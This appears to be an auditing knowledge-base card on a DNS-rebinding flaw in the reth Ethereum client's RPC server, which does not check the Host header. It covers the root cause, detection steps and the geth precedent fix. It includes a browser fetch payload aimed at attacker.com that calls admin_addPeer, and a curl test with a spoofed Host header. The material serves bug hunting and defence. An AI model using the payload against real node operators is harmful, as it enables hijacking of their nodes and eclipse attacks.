---
vulnerability_class: rpc_dns_rebinding
title: "RPC Interface DNS Rebinding: missing Host-header origin check (reth)"
protocol: eth-l1-clients
category: RPC / Interface Security
vulnerability_type: missing_origin_validation
attack_type: dns_rebinding|same_origin_bypass|unauthenticated_rpc
affected_component: rpc_http_server|middleware|host_allowlist
chain: ethereum
severity: medium
impact: node_control|peer_manipulation|debug_endpoint_abuse|eclipse_facilitation
severity_range: "MEDIUM"
source: Immunefi Ethereum Protocol Attackathon 2024-2025

primitives:
  - no_host_header_check_on_rpc_requests
  - dns_rebind_localhost_bypass
  - browser_same_origin_policy_bypass
  - debug_api_remote_abuse

affected_components:
  - rpc-builder (rpc-server middleware chain)
  - HTTP/WS transports
  - debug/admin namespaces

tags:
  - rpc
  - dns_rebinding
  - host_header
  - reth
  - cors_bypass
  - browser
  - local_node
  - attackathon

total_reports_analyzed: 1 (+geth precedent)

# Pattern Identity (Required)
root_cause_family: missing_origin_check_on_local_service
pattern_key: rpc_host_header_gap | dns_rebinding_local_bypass | unauthenticated_rpc_control

# Interaction Scope
interaction_scope: local_service_browser_boundary

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - Host
  - host_header
  - http.addr
  - allowed_hosts
  - tower_allowed_hosts
  - virtualhost
  - VIRTUALHOST
  - SameOrigin
  - 127.0.0.1
  - rpc-builder
---

# RPC DNS Rebinding (missing Host header validation)

## Overview

Ethereum RPC servers bind to localhost by default and rely on the browser's same-origin policy for
protection. DNS rebinding defeats this: attacker-controlled DNS answers `attacker.com` → their
server IP first (page loads), then → `127.0.0.1` (fetches go to the victim's local node). Unless
the RPC server validates the HTTP `Host` header against an allowlist, the malicious page can issue
arbitrary JSON-RPC calls — add/remove peers (eclipse), hammer debug endpoints, drain node
resources. **No CORS misconfiguration is required** — this is the key insight: CORS is irrelevant
because DNS rebinding makes the request same-origin.

**Real Report: Immunefi #37104 [BC-Insight] — Reth RPC is vulnerable to DNS rebinding attacks (alpharush)**
Report: `reports/eth-l1-clients_findings/37104-bc-insight-reth-rpc-is-vulnerable-to-dns-rebinding-attacks.md`

Reth's rpc-builder (`crates/rpc/rpc-builder/src/lib.rs#L1577-L1613` at the audited commit) installs
no host-checking middleware; default config (RPC not exposed to internet) is still vulnerable.
geth mitigated this class in 2018 via the `--http.virtualhosts` Host-header check
(github.com/ethereum/go-ethereum/pull/15962) — any client lacking an equivalent is affected.

**Root Cause Statement**: This vulnerability exists because the RPC HTTP server does not validate
the request Host header against a localhost allowlist, so a DNS-rebinded browser origin reaches
127.0.0.1:8545 same-origin and can drive privileged RPC namespaces without any CORS setting being
involved.

**Observed Frequency**: per-client config-class bug (1 reth report; geth precedent PR; check every
client/fork — L2 geth forks like Astria/Scroll/Facet in this corpus inherit or miss the fix)
**Consensus Severity**: MEDIUM (local node control; no chain split)

---

#### Agent Quick View

- Root cause statement: "This vulnerability exists because of missing_origin_check_on_local_service (no RPC Host header validation)"
- Pattern key: `rpc_host_header_gap | dns_rebinding_local_bypass | unauthenticated_rpc_control`
- Interaction scope: `local_service_browser_boundary`
- Primary affected component(s): `rpc_http_server`
- High-signal code keywords: `--http.addr`, `Host`, `virtualhost`, `tower_allowed_hosts`
- Typical sink / impact: `node_control` / `eclipse_facilitation`
- Validation strength: `high` (working PoC in report; geth precedent)

#### Contract / Boundary Map

- Entry surface(s): HTTP/WS RPC ports bound to localhost/LAN (default `--http.addr 127.0.0.1`)
- Contract hop(s): `attacker page -> DNS rebind (TTL=0, second A record 127.0.0.1) -> fetch localhost:8545 -> JSON-RPC`
- Trust boundary crossed: `browser origin boundary → node control plane`
- Shared state or sync assumption: `localhost binding implies local-only access (false under rebinding)`

#### Valid Bug Signals

- Signal 1: RPC middleware chain lacks any Host/Origin header check (grep for `virtualhost`, `allowed_hosts`, `Host` validation)
- Signal 2: Default config binds RPC to localhost AND exposes `debug`/`admin`/`net` namespaces without auth
- Signal 3: JWT only on engine API (8551), not the user-facing HTTP/WS ports
- Signal 4: Docs recommend `--http.addr 127.0.0.1` as "safe" without host checking

#### False Positive Guards

- Not this bug when: Host header checked against allowlist (geth `--http.virtualhosts`, or `tower_allowed_hosts`-style middleware) — verify the check covers WS too
- Safe if: RPC requires authentication (JWT/API key) on ALL namespaces, or bound to unix socket only
- Requires attacker control of: a website the node operator visits + DNS zone (no network position needed)
- CORS `*` on localhost-only deployments is a *separate*, lesser finding; rebinding works regardless of CORS

## Attack Flow (from report)

1. Attacker runs `attacker.com` with DNS records: initial A → attacker IP (serve JS), TTL 0; rebind A → `127.0.0.1`
2. Victim (node operator) browses to `attacker.com` on the machine running reth
3. JS waits, then `fetch('http://attacker.com:8545', {method:'POST', body: rpc})` — DNS now resolves to 127.0.0.1, same-origin, no CORS preflight issue
4. RPC executes: `admin_addPeer`/`admin_removePeer` (eclipse), `debug_*/trace_*` (CPU/disk abuse), `eth_*` state reads

## Related files in corpus (L2 geth forks — same class check)

- `reports/eth-l1-clients_findings/publications-astria-geth-zellic-audit-report-pdf.md`
- `reports/eth-l1-clients_findings/publications-facet-geth-zellic-audit-report-pdf.md`
- `reports/eth-l1-clients_findings/publications-reviews-2025-03-offchain-geth-14-4-securityreview-pdf.md`
- `reports/eth-l1-clients_findings/go-ethereum-security-md.md`

When auditing any geth fork: confirm the virtualhost check survived the fork (it lives in
`internal/httpauth`/`node` config plumbing and is easy to drop).

## Vulnerable Code Pattern (generic)

```rust
// VULNERABLE: middleware chain without host validation (#37104 pattern)
let server = HttpServerBuilder::default()
    .build(addr)
    .await?;             // no tower_allowed_hosts / Host check installed

// POC: DNS rebind attacker.com -> 127.0.0.1, then from the page:
fetch('http://attacker.com:8545', { method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({method: 'admin_addPeer',
                        params: ['enode://attacker@1.2.3.4:30303'], id: 1, jsonrpc: '2.0'}) })
```

## Detection & Hunt Strategy

1. Grep the RPC server builder for host allowlist middleware; if absent → finding (severity per
   exposed namespaces: admin/debug = higher).
2. Test: `curl -H 'Host: attacker.com' http://127.0.0.1:8545` — a 403/Reject means protected;
   JSON-RPC response means vulnerable.
3. Check WS endpoint separately (Host checks often only on HTTP).
4. For geth forks: diff `graphql`/`http` server setup against upstream geth for dropped virtualhost logic.
5. Verify docs/CLI defaults don't claim localhost binding is sufficient protection.

## References

- `reports/eth-l1-clients_findings/37104-bc-insight-reth-rpc-is-vulnerable-to-dns-rebinding-attacks.md`
- `reports/eth-l1-clients_findings/chainsafe-gossamer-sigp.md`- `reports/eth-l1-clients_findings/chainsafe-gossamer-sigp.md`- `reports/eth-l1-clients_findings/public-audits-reports-chainsafe-gossamer-review-pdf.md`- `reports/eth-l1-clients_findings/public-audits-reports-chainsafe-gossamer-review-pdf.md`- `reports/eth-l1-clients_findings/public-audits-reports-rise-sigma-prime-rise-core-node-security-assessment-report-v2-0-pdf.md`- `reports/eth-l1-clients_findings/publications-reviews-2023-08-scrolll2geth-initial-securityreview-pdf.md`- `reports/eth-l1-clients_findings/publicreports-l1-audits-taraxa-node-evm-l1-security-audit-report-halborn-final-pdf.md`
- geth PR #15962 (virtual hosts / Host header check — the precedent fix)
- OWASP DNS Rebinding guidance
- Immunefi/audit `37210` [BC-Insight] (erigon, INFO): Missing check of HTTP batch response length — `reports/eth-l1-clients_findings/37210-bc-insight-missing-check-of-http-batch-response-length.md` (Immunefi (CertiK))
- Immunefi/audit `39018` [BC-Insight] (consensus-specs, INFO): Rate limiting under-specification and consequences — `reports/eth-l1-clients_findings/39018-bc-insight-rate-limiting-under-specification-and-consequences.md` (Immunefi (csludo))
- Immunefi/audit `38908` [BC-Insight] (erigon, INFO): Missing failed subcalls in erigon tracers when encountering ErrInsufficientBalance — `reports/eth-l1-clients_findings/38908-bc-insight-missing-failed-subcalls-in-erigon-tracers-when-encountering-errinsufficientbalance.md` (Immunefi (a3yip6))
- Immunefi/audit `GR-CR-24-100` [severity: none] (grandine, INFO): Cleartext logging of validator API token to STDOUT — `reports/eth-l1-clients_findings/grandine-audit-x41-code-review-grandine-final-report-2024-11-29-pdf.md` (X41)
- Immunefi/audit `ETD-001` [Informational] (eth-docker, INFO): Sensitive data can be handled by secrets (eth-docker updates) — `reports/eth-l1-clients_findings/public-audits-reports-eth-docker-sigma-prime-eth-docker-update-2-v2-0-pdf.md` (Sigma Prime)
